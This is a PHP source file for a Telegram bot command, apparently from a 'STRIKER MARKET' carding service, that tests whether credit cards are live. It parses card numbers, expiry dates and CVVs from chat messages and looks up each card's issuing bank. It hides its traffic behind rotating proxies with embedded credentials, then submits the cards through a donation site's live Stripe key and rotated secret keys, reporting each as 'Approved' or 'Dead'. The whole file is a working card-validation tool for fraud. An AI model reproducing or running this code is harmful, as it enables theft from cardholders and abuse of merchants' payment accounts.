<?php

/*

///==[Stripe User Merchant Commands]==///

/schk creditcard - Checks the Credit Card

*/


include __DIR__."/config/config.php";
include __DIR__."/config/variables.php";
include __DIR__."/functions/bot.php";
include __DIR__."/functions/functions.php";
include __DIR__."/functions/db.php";

////////////====[MUTE]====////////////
if(strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mon = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $year = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $sk = $config['sk_keys'];
            shuffle($sk);
            $sec = $sk[0];

            file_put_contents('sk.txt',$sk);
    
            ###CHECKER PART###  
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }

            
            
            $rp1 = array(
            1 => 'kwnszuaa-rotate:nbv7p37iwa7t@p',
            2 => 'kwnszuaa-rotate:nbv7p37iwa7t@p',
            3 => 'user-rotate:pass',
            4 => 'user-rotate:pass',
            5 => 'user-rotate:pass',
            ); 
            $rpt = array_rand($rp1);
            $rotate = $rp1[$rpt];


            $ip = array(
            1 => 'socks5://p.webshare.io:1080',
            2 => 'http://p.webshare.io:80',
            ); 
            $socks = array_rand($ip);
            $socks5 = $ip[$socks];

 
            $url = "https://api.ipify.org/";   

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_PROXY, $socks5);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
            $ip1 = curl_exec($ch);
            curl_close($ch);
            ob_flush();   
            if (isset($ip1)){
            $ip = "Proxy live";
            }
            if (empty($ip1)){
            $ip = "Proxy Dead:[".$rotate."]";
            }

            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_PROXY, $socks5);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'authority: api.stripe.com',
                'method: POST',
                'path: /v1/tokens',
                'scheme: https',
                'accept: application/json',
                'accept-language: en-US,en;q=0.9',
                'content-type: application/x-www-form-urlencoded',
                'origin: https://checkout.stripe.com',
                'referer: https://checkout.stripe.com/',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-site',
                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
                'x-requested-with: XMLHttpRequest',
            ));

            curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F308cc4f)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F92.0.4515.159+Safari%2F537.36&device_id=f0b0d9b9-805b-4125-a7c7-5b414a04aa2c&referrer=https%3A%2F%2Fdonate-can.keela.co%2Fembed%2Ffoundations-for-social-change&time_checkout_opened=1629544338&time_checkout_loaded=1629544338&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&time_on_page=&guid=bab66549-00a4-453d-bb46-c1a5b4574ae605f1ee&muid=593746ec-57dd-4c47-af62-262eb860137da6aeff&sid=f3abed8b-e4d2-4b80-bfa3-8eb3e3829f270b151a&key=pk_live_moSrTlu0TpyA6fT2puny9SWr');
            $result = curl_exec($ch);

            if(strpos($result, 'error')){
                $stripemessage = capture($result,'"code": "','"');
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» <code>$stripemessage</code>
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
                return;

            }
            
            $id = capture($result,'"id": "','"');
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_PROXY, $socks5);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'authority: api.stripe.com',
                'method: POST',
                'path: /v1/customers',
                'scheme: https',
                'accept: application/json',
                'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
                'content-type: application/x-www-form-urlencoded',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-site',
                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
                'user-agent: '.$ua.'',
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Aju Bose&source='.$id);
            $result1 = curl_exec($ch);
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);
            
            ###END OF CHECKER PART###
            if (array_in_string($result1, $live_array)) {
                $stripemessage = trim(strip_tags(capture($result1,'"message": "','"')));
                $live = True;
            }elseif(strpos($result1, '"cvc_check": "unavailable"')){
                $stripemessage = 'CVC Check Unavailable';
                $live = False;
            }else{
                $stripemessage = capture($result1,'"decline_code": "','"');
                if(empty($stripemessage)){
                    $stripemessage = $result1;
                }
                $live = False;
            }
            
            if($live) {
              addTotal();
              addUserTotal($userId);
              addCCN();
              addUserCCN($userId);
              addCVV();
              addUserCVV($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Approved ✅
Response -» $stripemessage
Gateway -» User Stripe Merchant
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}

            else{
              addTotal();
              addUserTotal($userId);

              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» <code>$stripemessage</code>
Gateway -» Stripe Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>CHECKBY → <a href='tg://user?id=$userId'>$firstname</a></b>
<b>BOTBY → <a href='t.me/strikermarket'>STRIKER MARKET</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
          
        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
        }
    }
}


?>
